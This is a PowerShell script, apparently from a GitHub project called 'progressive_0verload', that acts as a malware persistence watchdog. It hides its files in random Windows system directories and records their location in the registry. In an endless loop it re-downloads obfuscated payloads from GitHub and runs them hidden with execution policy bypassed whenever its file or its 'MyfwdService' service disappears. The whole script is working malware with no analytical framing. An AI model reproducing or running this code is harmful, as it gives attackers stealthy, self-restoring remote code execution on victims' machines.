param(
    [string]$basePath
)

Start-Process powershell.exe -ArgumentList "-Command `"whoami >> C:\whoami_fwd.txt`""

$paths = @(
    "$env:windir\system32\config\systemprofile\AppData\Local",
    "$env:windir\System32\WindowsPowerShell\v1.0\Modules",
    "$env:windir\System32\drivers\etc",
    "$env:windir\System32\LogFiles\WMI"
)

$serviceName = "MyfwdService"
$propertyName = "fwd"
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName"
$initServicefwdPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
$initServicefwdPath = "$initServicefwdPath\init_service_fwd.ps1"
$item = Get-ItemProperty -Path "$basePath" -Name $propertyName -ErrorAction SilentlyContinue
$issetup = $false

if(-not($item)){
    $fwdPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
    $fwdPath = "$fwdPath\f.ps1"
    Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $fwdPath -Force | Out-Null
    $issetup = $true
}

else{
    $fwdPath = $item.$propertyName
    $issetup = $false
}



function Get-ServiceReg{
    param([string]$path)

    $r = Get-Item -Path $path -ErrorAction SilentlyContinue

    if(-not($r)){
        return $true
    }
    return $false
}



function Get-ServiceName{
    param([string]$name)

    try {
        $s = Get-Service -Name $name -ErrorAction SilentlyContinue
        if(-not($s)){
            return $true
        }
    }
    catch {
        return $false
    }
    return $false
}




while ($true) {
    $x = Get-ServiceReg -path $regPath
    $y = Get-ServiceName -name $serviceName
    if(-not(Test-Path -Path $fwdPath -PathType Leaf)){
        if(-not($issetup)){
            $fwdPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
            $fwdPath = "$fwdPath\f.ps1"
            Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $fwdPath -Force | Out-Null
        }
        iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/obfuscated%20payloads/f.ps1" -OutFile $fwdPath
        iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_fwd.ps1" -OutFile $initServicefwdPath
        powershell.exe -ep bypass -noP -w hidden $initServicefwdPath -basePath "$basePath" -fwdPath $fwdPath
    }

    elseif($x -or $y){
        iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_fwd.ps1" -OutFile $initServicefwdPath
        powershell.exe -ep bypass -noP -w hidden $initServicefwdPath -basePath "$basePath" -fwdPath $fwdPath
    }
    $issetup = $false
}